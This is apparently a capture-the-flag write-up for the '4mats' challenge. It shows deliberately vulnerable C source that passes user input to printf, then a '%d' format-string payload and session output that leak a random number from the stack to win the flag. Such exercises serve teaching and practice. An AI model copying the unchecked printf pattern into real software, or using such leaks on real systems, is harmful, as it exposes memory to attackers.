
# 4mats

## Challenge Description
>Lets get to know each other
`nc fun.chall.seetf.sg 50001`
For beginners: -   [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

## Solution
We are given two files, the executable and it's source code -> `vuln`, `vuln.c`
From the challenge description, we understand that it's a string format vulnerability, now we have to spot where exactly is that vulnerability.

Looking through the source code:
```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char name[16];
char echo[100];
int number;
int guess;
int set = 0;
char format[64] = {0};


void guess_me(int fav_num){
    printf("Guess my favourite number!\n");
    scanf("%d", &guess);
    if (guess == fav_num){
        printf("Yes! You know me so well!\n");
		system("cat flag");
        exit(0);}
   else{
       printf("Not even close!\n");
   }
       
}


int main() {

mat1:
    printf("Welcome to SEETF!\n");
    printf("Please enter your name to register: %s\n", name);
    read(0, name, 16);

    printf("Welcome: %s\n", name);

    while(1) {
mat2:
        printf("Let's get to know each other!\n");
        printf("1. Do you know me?\n");
        printf("2. Do I know you?\n");

mat3:
        scanf("%d", &number);


        switch (number)
        {
            case 1:
                srand(time(NULL));
                int fav_num = rand() % 1000000;
		set += 1;
mat4:
                guess_me(fav_num);
                break;

            case 2:
mat5:
                printf("Whats your favourite format of CTFs?\n");
		read(0, format, 64);
                printf("Same! I love \n");
		printf(format);
                printf("too!\n");
                break;

            default:
                printf("I print instructions 4 what\n");
		if (set == 1)
mat6:
                    goto mat1;
		else if (set == 2)
		    goto mat2;
		else if (set == 3)
mat7:
                    goto mat3;
		else if (set == 4)
                    goto mat4;
		else if (set == 5)
                    goto mat5;
		else if (set == 6)
                    goto mat6;
		else if (set == 7)
                    goto mat7;
                break;
        }
    }
    return 0;
}
```

We see that the vulnerability is in the second line here: 
```C
printf("Same! I love \n");
printf(format); // vulnerable
printf("too!\n");
```

now what can we achieve with that?
We see that the flag is printed only when you guess the program's favorite number, so that means we need to use the string format vulnerability to leak out values from the stack, because the variable `fav_num` is stored on the stack.
But that is not enough, because each time we try to guess the favorite number, it generates a new favorite number :( .
However, the code is split to labels, and we see that we have a label that skips the generation of a random number, and directly asks what is the favorite number, that label is `mat4`.
To reach that label, we need to increase the variable `set` to `4` and then enter an invalid option that is not covered in the switch case, so we can reach the default section which jumps to different labels:
```c
default:
	printf("I print instructions 4 what\n");
	if (set == 1)
mat6:
	    goto mat1;
    else if (set == 2)
        goto mat2;
    else if (set == 3)
mat7:
        goto mat3;
    else if (set == 4)
        goto mat4;
    else if (set == 5)
        goto mat5;
    else if (set == 6)
        goto mat6;
    else if (set == 7)
        goto mat7;
    break;
```
To increase `set`, we need to try case 1, which increases `set` by 1 each time.

So first, we start the program, and enter option `1` four times:
```
Welcome to SEETF!
Please enter your name to register:
hello
Welcome: hello

---- first time ----
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
50
Not even close!

---- second time ----
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
50
Not even close!

---- third time ----
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
50
Not even close!

---- fourth time ----
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
50
Not even close!
```

now `set = 4`, and we can use the format string vulnerability to leak out the favorite number from the stack.
We will use `%d` specifier because we are looking for a number, `printf` will look for a value on the stack and convert it to a decimal integer.
```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?
%d %d %d %d %d %d %d %d %d
Same! I love
134520960 64 134514518 1 -6646956 -6646948 983906 -135281700 -6647104
too!
```

Success! we leaked values from the stack, now we know the favorite number must be below `1000000`, because of the modulo -> `int fav_num = rand() % 1000000;`.
I checked this multiple times, and the numbers `64` and `1` stay the same every run, so the favorite number must be `983906`.

Now that we've got the favorite number, we can enter an invalid option to enter the default case, and jump to label `mat4`, there we can enter the number we found:
```
Let's get to know each other!
1. Do you know me?
2. Do I know you?
8
I print instructions 4 what
Guess my favourite number!
983906
Yes! You know me so well!
SEE{_censored_}
```
